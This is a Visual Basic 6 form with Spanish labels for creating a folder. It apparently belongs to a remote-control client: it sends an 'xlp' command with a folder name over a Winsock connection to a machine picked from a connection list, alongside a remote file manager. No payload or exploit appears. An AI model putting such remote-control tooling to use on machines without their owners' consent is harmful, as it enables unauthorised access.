VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Begin VB.Form carpeta 
   BorderStyle     =   5  'Sizable ToolWindow
   Caption         =   "Crear nueva carpeta"
   ClientHeight    =   900
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   2805
   LinkTopic       =   "Form5"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   900
   ScaleWidth      =   2805
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   1560
      OleObjectBlob   =   "carpeta.frx":0000
      Top             =   600
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Cancelar"
      Height          =   375
      Left            =   1440
      TabIndex        =   2
      Top             =   480
      Width           =   1215
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Crear"
      Height          =   375
      Left            =   120
      TabIndex        =   1
      Top             =   480
      Width           =   1215
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   2535
   End
End
Attribute VB_Name = "carpeta"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function PathFileExists Lib "shlwapi" Alias "PathFileExistsA" (ByVal lppath As String) As Boolean
Private Declare Function MessageBox Lib "user32" Alias "MessageBoxA" (ByVal hwnd As Long, ByVal message As String, ByVal title As String, ByVal utype As Integer) As Integer

Dim vIndex As Variant
Dim Index_n As Integer

Private Sub Command1_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    If Not Text1.Text = "" Then
    
        Form1.Winsock1(vIndex(0)).SendData "xlp" & Text1.Text
        
        Text1.Text = ""
        Unload Me
    Else
        Text1.SetFocus
    End If
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If
End Sub

Private Sub Command2_Click()
Unload Me
End Sub

Private Sub Form_Load()
Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")

If PathFileExists(App.path & "\sk\skin.skn") Then
    Skin1.LoadSkin App.path & "\sk\skin.skn"
    Skin1.ApplySkin carpeta.hwnd
End If

Text1.Text = fmanager.arch.SelectedItem.SubItems(2)
Text1.SetFocus
End Sub
